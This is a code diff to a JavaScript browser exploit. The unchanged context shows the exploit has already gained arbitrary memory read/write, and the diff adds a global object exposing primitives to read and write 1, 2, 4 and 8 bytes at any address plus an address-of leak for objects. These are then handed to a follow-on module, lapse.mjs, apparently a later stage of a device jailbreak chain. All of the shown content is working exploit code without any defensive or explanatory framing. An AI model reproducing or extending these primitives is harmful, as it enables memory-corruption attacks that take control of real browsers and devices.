@@ -829,6 +829,64 @@ async function make_arw(reader, view2, pop) {
     );
     log('achieved arbitrary r/w');
 
+    window.p = {
+        read1(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read8(addr);
+            return res;
+        },
+
+        read2(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read16(addr);
+            return res;
+        },
+
+        read4(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read32(addr);
+            return res;
+        },
+
+        read8(addr) {
+            addr = new Int(addr.low, addr.hi);
+            const res = mem.read64(addr);
+            return new int64(res.low, res.high);
+        },
+
+        write1(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            mem.write8(addr, value);
+        },
+
+        write2(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            mem.write16(addr, value);
+        },
+
+        write4(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            mem.write32(addr, value);
+        },
+
+        write8(addr, value) {
+            addr = new Int(addr.low, addr.hi);
+            if (value instanceof int64) {
+                value = new Int(value.low, value.hi);
+                mem.write64(addr, value);
+            } else {
+                mem.write64(addr, new Int(value));
+            }
+
+        },
+
+        leakval(obj) {
+            const res = mem.addrof(obj);
+            return new int64(res.low, res.high);
+        }
+    };
+
+
     rdr.restore();
     // set the refcount to a high value so we don't free the memory, view's
     // death will already free it (a StringImpl is currently using the memory)
@@ -856,7 +914,8 @@ async function main() {
     await make_arw(rdr, view2, pop);
 
     clear_log();
-    // path to your script that will use the exploit
-    import('./lapse.mjs');
+
+     import('./lapse.mjs');
+    
 }
 main();
